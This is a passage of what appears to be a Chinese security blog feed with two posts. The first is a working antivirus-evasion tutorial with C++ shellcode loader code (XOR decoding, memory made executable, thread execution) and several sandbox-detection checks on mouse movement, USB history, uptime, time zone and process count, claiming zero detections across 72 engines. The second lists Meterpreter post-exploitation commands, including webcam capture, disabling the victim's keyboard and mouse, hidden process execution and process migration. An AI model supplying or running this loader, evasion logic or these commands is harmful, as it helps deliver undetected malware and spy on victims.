class="function"></span>&#123;</span><br><span class="line">    MONITORENUMPROC pMonitorInfoCallback = (MONITORENUMPROC)MonitorInfoCallback;</span><br><span class="line">    <span class="comment">//https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getsystemmetrics</span></span><br><span class="line">    <span class="comment">//改函数具体参数见文档</span></span><br><span class="line">    <span class="keyword">int</span> iXResolution = GetSystemMetrics(SM_CXSCREEN);</span><br><span class="line">    <span class="keyword">int</span> iYResolution = GetSystemMetrics(SM_CYSCREEN);</span><br><span class="line">    <span class="comment">//std::cout &lt;&lt; iXResolution &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="comment">//std::cout &lt;&lt; iYResolution &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="keyword">if</span> (iXResolution &lt; <span class="number">1000</span> &amp;&amp; iYResolution &lt; <span class="number">1000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> iNumberOfMonitors = GetSystemMetrics(SM_CMONITORS);<span class="comment">//获取可见显示器数量</span></span><br><span class="line">    <span class="comment">//std::cout &lt;&lt; iNumberOfMonitors &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="keyword">bool</span> bSandBox = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">//用枚举来查询每个显示器</span></span><br><span class="line">    <span class="comment">//https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-enumdisplaymonitors</span></span><br><span class="line">    EnumDisplayMonitors(<span class="literal">NULL</span>, <span class="literal">NULL</span>, pMonitorInfoCallback, (LPARAM)(&amp;bSandBox));</span><br><span class="line">    <span class="keyword">if</span> (bSandBox)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> bHardwareDetection = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">bool</span> bWindowDetection = <span class="literal">true</span>;</span><br><span class="line">    bHardwareDetection =HardwareCapacity();</span><br><span class="line">    bWindowDetection=MonitorInfo();</span><br><span class="line">    <span class="keyword">if</span> (bHardwareDetection == <span class="literal">false</span> || bWindowDetection == <span class="literal">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line">    DWORD dwOldProtect; <span class="comment">// 内存页属性</span></span><br><span class="line"><span class="comment">/* length: 800 bytes */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;X64shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取shellcode大小</span></span><br><span class="line">    shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 增加异或代码 */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++) &#123;</span><br><span class="line">        buf[i] ^= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    VirtualAlloc(</span></span><br><span class="line"><span class="comment">        NULL, // 基址</span></span><br><span class="line"><span class="comment">        800,  // 大小</span></span><br><span class="line"><span class="comment">        MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">        PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* shellcode = (<span class="keyword">char</span>*)VirtualAlloc(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        shellcode_size,</span><br><span class="line">        MEM_COMMIT,</span><br><span class="line">        PAGE_READWRITE <span class="comment">// 只申请可读可写</span></span><br><span class="line">        <span class="comment">//原来的属性是PAGE_EXECUTE_READWRITE</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将shellcode复制到可读可写的内存页中</span></span><br><span class="line">    CopyMemory(shellcode, buf, shellcode_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里开始更改它的属性为可执行</span></span><br><span class="line">    VirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待几秒，兴许可以跳过某些沙盒呢？</span></span><br><span class="line">    Sleep(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">    hThread = CreateThread(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">        &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到现在又绕过了两家杀软，目前就剩下一家了，免杀率<strong>1/72</strong></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/64.png?raw=true" alt="image-20200523124705754"></p><h4 id="检测系统是否是刚装的"><a href="#检测系统是否是刚装的" class="headerlink" title="检测系统是否是刚装的"></a>检测系统是否是刚装的</h4><p>大多数分析的系统都是新的，比如说专门分析的虚拟机会拍摄快照方便回滚，而快照大部分都是初始化的系统，比如注册列表不存在有U盘插上过</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">UsbNumberJudgment</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HKEY hKey;</span><br><span class="line">DWORD dwMountedUSBDevicesCount;</span><br><span class="line">RegOpenKeyEx(HKEY_LOCAL_MACHINE, <span class="string">L&quot;SYSTEM\\ControlSet001\\Enum\\USBSTOR&quot;</span>, <span class="number">0</span>, KEY_READ, &amp;hKey);</span><br><span class="line">RegQueryInfoKey(hKey, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;dwMountedUSBDevicesCount, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (dwMountedUSBDevicesCount &lt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="检测鼠标移动轨迹"><a href="#检测鼠标移动轨迹" class="headerlink" title="检测鼠标移动轨迹"></a>检测鼠标移动轨迹</h4><p>沙箱嘛，有些肯定是没有鼠标的，可以设置鼠标移动轨迹，如果移动多少距离才执行shellcode.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">DetectMouseMovementTrack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    POINT CurrentMousePosition;</span><br><span class="line">    POINT PreviousMousePosition;</span><br><span class="line">    GetCursorPos(&amp;PreviousMousePosition);</span><br><span class="line">    <span class="keyword">double</span> dMouseDistance = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        GetCursorPos(&amp;CurrentMousePosition);</span><br><span class="line">        dMouseDistance += <span class="built_in">sqrt</span>(</span><br><span class="line">            <span class="built_in">pow</span>(CurrentMousePosition.x - PreviousMousePosition.x, <span class="number">2</span>) +</span><br><span class="line">            <span class="built_in">pow</span>(CurrentMousePosition.y - PreviousMousePosition.y, <span class="number">2</span>)</span><br><span class="line">        );</span><br><span class="line">        Sleep(<span class="number">100</span>);</span><br><span class="line">        <span class="comment">//std::cout &lt;&lt; dMouseDistance &lt;&lt; std::endl;</span></span><br><span class="line">        PreviousMousePosition = CurrentMousePosition;</span><br><span class="line">        <span class="keyword">if</span> (dMouseDistance &gt; <span class="number">20000</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//std::cout &lt;&lt; dMouseDistance &lt;&lt; std::endl;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有下面可以看见我们鼠标移动的距离，直到我们设定的距离后才退出</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/65.png?raw=true" alt="image-20200523140052524"></p><h4 id="检查时间"><a href="#检查时间" class="headerlink" title="检查时间"></a>检查时间</h4><p>有些沙箱嘛，为了快速的结束检测会加速当前时间，毕竟检测一个病毒并不能花太多时间。</p><h5 id="首先检测时区是否对应"><a href="#首先检测时区是否对应" class="headerlink" title="首先检测时区是否对应"></a>首先检测时区是否对应</h5><p>比如你的目标是中欧的，那么他的时区就是<code>CENTRAL EUROPEAN STANDARD TIME</code>，我本地是<code>NORTH ASIA EAST STANDARD TIME</code>，所有我用该值来判断，视目标位置来具体判断</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">TimeZoneDetection</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SetThreadLocale(MAKELCID(MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), SORT_DEFAULT));</span><br><span class="line">    DYNAMIC_TIME_ZONE_INFORMATION DynamicTimeZoneInfo;</span><br><span class="line">    GetDynamicTimeZoneInformation(&amp;DynamicTimeZoneInfo);</span><br><span class="line">    <span class="keyword">wchar_t</span> wcTimeZoneName[<span class="number">128</span> + <span class="number">1</span>];</span><br><span class="line">    StringCchCopyW(wcTimeZoneName, <span class="number">128</span>, DynamicTimeZoneInfo.TimeZoneKeyName);</span><br><span class="line">    CharUpperW(wcTimeZoneName);</span><br><span class="line">    <span class="keyword">if</span> (!wcsstr(wcTimeZoneName, <span class="string">L&quot;NORTH ASIA EAST STANDARD TIME&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="检查时间流动性"><a href="#检查时间流动性" class="headerlink" title="检查时间流动性"></a>检查时间流动性</h5><p>该方法通过检查CPU周期的时间和当前UNIX时间戳是否流动相关，如果超过了那么要么是在调试，要么是在沙箱里面</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">TimeAcceleratedJudgment</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">clock_t</span> ClockStartTime, ClockEndTime;</span><br><span class="line">    <span class="keyword">time_t</span> UnixStartTime = time(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//std::cout &lt;&lt; &quot;UnixStartTime:&quot; &lt;&lt; UnixStartTime &lt;&lt; std::endl;</span></span><br><span class="line">    ClockStartTime = clock();</span><br><span class="line">    Sleep(<span class="number">10000</span>);<span class="comment">//暂停10秒</span></span><br><span class="line">    ClockEndTime = clock();</span><br><span class="line">    <span class="keyword">time_t</span> UnixEndTime = time(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//std::cout &lt;&lt; &quot;StartTime:&quot; &lt;&lt; ClockStartTime &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="comment">//std::cout &lt;&lt; &quot;EndTime:&quot; &lt;&lt; ClockEndTime &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//std::cout &lt;&lt; &quot;UnixEndTime:&quot; &lt;&lt; UnixEndTime &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="keyword">int</span> iTimeDifference = ((UnixEndTime - UnixStartTime) * <span class="number">1000</span>) - (ClockEndTime - ClockStartTime);</span><br><span class="line">    <span class="keyword">if</span> (iTimeDifference&gt;<span class="number">150</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="检查系统运行时间"><a href="#检查系统运行时间" class="headerlink" title="检查系统运行时间"></a>检查系统运行时间</h5><p>虚拟机容易回滚，那么运行的时间肯定是很短的，那么就判断时间就好</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">CheckRunningTime</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ULONGLONG uptime = GetTickCount64() / <span class="number">1000</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; uptime;</span><br><span class="line"><span class="keyword">if</span> (uptime &lt; <span class="number">1200</span>) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="检查运行进程数量"><a href="#检查运行进程数量" class="headerlink" title="检查运行进程数量"></a>检查运行进程数量</h4><p>沙箱是精简版的系统，就是说能少运行就少运行，能不运行就不运行，所以我们可以查看系统进程来判断是否在虚拟机中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">CheckTheNumberOfProcesses</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD dwRunningProcessesIDs[<span class="number">1024</span>];</span><br><span class="line">DWORD dwRunningProcessesCountBytes;</span><br><span class="line">DWORD dwRunningProcessesCount;</span><br><span class="line">EnumProcesses(dwRunningProcessesIDs, <span class="keyword">sizeof</span>(dwRunningProcessesIDs), &amp;dwRunningProcessesCountBytes);</span><br><span class="line">dwRunningProcessesCount = dwRunningProcessesCountBytes / <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; dwRunningProcessesCount;</span></span><br><span class="line"><span class="keyword">if</span> (dwRunningProcessesCount &lt; <span class="number">50</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="百分百免杀"><a href="#百分百免杀" class="headerlink" title="百分百免杀"></a>百分百免杀</h4><p>到检测分辨率那边，就剩下一家没绕过了，后面测试了好多种方法都还是绕不过去，然后看那边报毒是X64 木马程序，我就预感到可能是因为字符串的问题导致没绕过去的，最后面把代码换成N个字符串相加即可，尝试这样拼接。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">代码有点瑕疵，改完在贴上</span><br></pre></td></tr></table></figure><p>挑战全球杀软成功！免杀率<strong>0/72</strong></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/66.png?raw=true" alt="image-20200523192121311"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">参考文章</span><br><span class="line">https:&#x2F;&#x2F;0xpat.github.io&#x2F;Malware_development_part_2&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;system&#x2F;122134.html</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>恶意程序研究之Meterpreter后渗透常用命令</title>
    <link href="https://www.ascotbe.com/2020/05/06/MeterpreterCommand/"/>
    <id>https://www.ascotbe.com/2020/05/06/MeterpreterCommand/</id>
    <published>2020-05-06T15:45:42.000Z</published>
    <updated>2021-05-04T06:03:28.416Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>写免杀的时候在想，msf连上后能干啥？之前只有大概的了解下，具体没怎么实操，后面把之前写的文章过了一遍，然后谷歌了一下发现还有好多不知道的地方借此删除了去年写的那篇文章合并到了一起，本篇会持续更新，如果看到师傅们有什么新奇的操作都会记录下来</p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/MSF/15.png?raw=true" alt="image-20200525181824723" style="zoom:50%;" /><h4 id="Metasploit体系框架"><a href="#Metasploit体系框架" class="headerlink" title="Metasploit体系框架"></a>Metasploit体系框架</h4><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/MSF/1.png?raw=true" alt="1"></p><h4 id="文件目录解析"><a href="#文件目录解析" class="headerlink" title="文件目录解析"></a>文件目录解析</h4><p>核心文件包括<code>data</code>、<code>modules</code>、<code>scripts</code>、<code>tools</code>、<code>plugins</code></p><h6 id="data"><a href="#data" class="headerlink" title="data"></a>data</h6><p>该文件里常用的的功能在<code>wordlists</code>（字典）里面</p><h6 id="modules"><a href="#modules" class="headerlink" title="modules"></a>modules</h6><p>该文件夹里包括了<code>msf</code>最核心的几个文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">auxiliary（漏洞辅助模块一般是没有攻击载荷的漏洞攻击)</span><br><span class="line">Exploits（渗透攻击模块)</span><br><span class="line">st（开发模块）</span><br><span class="line">pads（漏洞负载模块)</span><br><span class="line">Encode码器模块）</span><br><span class="line">Nops（空指令模块&gt;</span><br></pre></td></tr></table></figure><h6 id="scripts"><a href="#scripts" class="headerlink" title="scripts"></a>scripts</h6><p>该文件夹里面包含这各种脚本</p><h6 id="tools"><a href="#tools" class="headerlink" title="tools"></a>tools</h6><p>该文件夹中存放着大量的使用工具</p><h6 id="plugins"><a href="#plugins" class="headerlink" title="plugins"></a>plugins</h6><p>该文件夹放着大量插件</p><h4 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h4><h5 id="基本系统命令"><a href="#基本系统命令" class="headerlink" title="基本系统命令"></a>基本系统命令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sessions -i &lt;ID值&gt;  <span class="comment">#进入会话   -k  杀死会话</span></span><br><span class="line">background  <span class="comment">#将当前会话放置后台</span></span><br><span class="line">run  <span class="comment">#执行已有的模块，输入run后按两下tab，列出已有的脚本</span></span><br><span class="line">info <span class="comment">#查看已有模块信息</span></span><br><span class="line">getuid <span class="comment"># 查看权限 </span></span><br><span class="line">getpid <span class="comment"># 获取当前进程的pid</span></span><br><span class="line">sysinfo <span class="comment"># 查看目标机系统信息</span></span><br><span class="line">ps <span class="comment"># 查看当前活跃进程    kill &lt;PID值&gt; 杀死进程</span></span><br><span class="line">idletime <span class="comment">#查看目标机闲置时间</span></span><br><span class="line">reboot / shutdown   <span class="comment">#重启/关机</span></span><br><span class="line">shell <span class="comment">#进入目标机cmd shell</span></span><br></pre></td></tr></table></figure><h5 id="开关键盘-鼠标"><a href="#开关键盘-鼠标" class="headerlink" title="开关键盘/鼠标"></a>开关键盘/鼠标</h5><p><code>uictl [enable/disable] [keyboard/mouse/all] </code> #开启或禁止键盘/鼠标</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uictl <span class="built_in">disable</span> mouse  <span class="comment">#禁用鼠标</span></span><br><span class="line">uictl <span class="built_in">disable</span> keyboard  <span class="comment">#禁用键盘</span></span><br><span class="line">uictl <span class="built_in">enable</span> mouse  <span class="comment">#开启鼠标</span></span><br></pre></td></tr></table></figure><h5 id="摄像头命令"><a href="#摄像头命令" class="headerlink" title="摄像头命令"></a>摄像头命令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webcam_list  <span class="comment">#查看摄像头</span></span><br><span class="line">webcam_snap   <span class="comment">#通过摄像头拍照</span></span><br><span class="line">webcam_stream   <span class="comment">#通过摄像头开启视频</span></span><br></pre></td></tr></table></figure><p>如果系统不存在摄像头的话就会报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_list</span><br><span class="line">[-] webcam_list: Operation failed: A device attached to the system is not functioning.</span><br><span class="line">meterpreter &gt; webcam_snap</span><br><span class="line">[-] webcam_list: Operation failed: A device attached to the system is not functioning.</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p>而如果你存在摄像头的话是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_list</span><br><span class="line">1: FaceTime HD Camera (Built-in)</span><br></pre></td></tr></table></figure><p>拍摄照片</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/MSF/2.png?raw=true" alt="image-20200525115133619"></p><h5 id="执行文件"><a href="#执行文件" class="headerlink" title="执行文件"></a>执行文件</h5><p>参数列表如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; execute </span><br><span class="line">Usage: execute -f file [options]</span><br><span class="line">Executes a <span class="built_in">command</span> on the remote machine.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -H        Create the process hidden from view.</span><br><span class="line">    -a &lt;opt&gt;  The arguments to pass to the <span class="built_in">command</span>.</span><br><span class="line">    -c        Channelized I/O (required <span class="keyword">for</span> interaction).</span><br><span class="line">    -d &lt;opt&gt;  The <span class="string">&#x27;dummy&#x27;</span> executable to launch when using -m.</span><br><span class="line">    -f &lt;opt&gt;  The executable <span class="built_in">command</span> to run.</span><br><span class="line">    -h        Help menu.</span><br><span class="line">    -i        Interact with the process after creating it.</span><br><span class="line">    -k        Execute process on the meterpreters current desktop</span><br><span class="line">    -m        Execute from memory.</span><br><span class="line">    -s &lt;opt&gt;  Execute process <span class="keyword">in</span> a given session as the session user</span><br><span class="line">    -t        Execute process with currently impersonated thread token</span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute -H -i -f cmd.exe <span class="comment"># 创建新进程cmd.exe，-H不可见，-i交互</span></span><br></pre></td></tr></table></figure><p>这个路径是我们<strong>shellcode.exe</strong>运行的当前路径，如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; execute -H -i -f powershell.exe</span><br><span class="line">Process 12728 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Windows PowerShell</span><br><span class="line">??Ȩ???? (C) Microsoft Corporation??????????Ȩ????</span><br><span class="line"></span><br><span class="line">?????µĿ?ƽ̨ PowerShell https://aka.ms/pscore6</span><br><span class="line"></span><br><span class="line">PS C:\virus\ShellCode\ShellCode\Release&gt; </span><br></pre></td></tr></table></figure><h5 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h5><p>参数列表如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; migrate</span><br><span class="line">Usage: migrate &lt;&lt;<span class="string">pid&gt; | -P &lt;pid</span>&gt; | -N &lt;name&gt;&gt; [-t timeout]</span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getpid    <span class="comment"># 获取当前进程的pid</span></span><br><span class="line">ps   <span class="comment"># 查看当前活跃进程</span></span><br><span class="line">migrate &lt;pid值&gt;    <span class="comment">#将Meterpreter会话移植到指定pid值进程中</span></span><br><span class="line"><span class="built_in">kill</span> &lt;pid值&gt;   <span class="comment">#杀死进程</span></span><br></pre></td></tr></table></figure><p>用<code>ps</code>查看当前进程，这里只列出两个，不然太多了没列出的必要，可以看到<strong>wsctrl.exe</strong>是系统进程，而<strong>powershell.exe</strong>是用户启动的进程权限相同</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> PID    PPID   Name                                                                Arch  Session  User                 Path</span><br><span class="line"> ---    ----   ----                                                                ----  -------  ----                 ----</span><br><span class="line"></span><br><span class="line">2192   708    wsctrl.exe                                                                                              </span><br><span class="line">12032  5792   powershell.exe                                                      x64   1        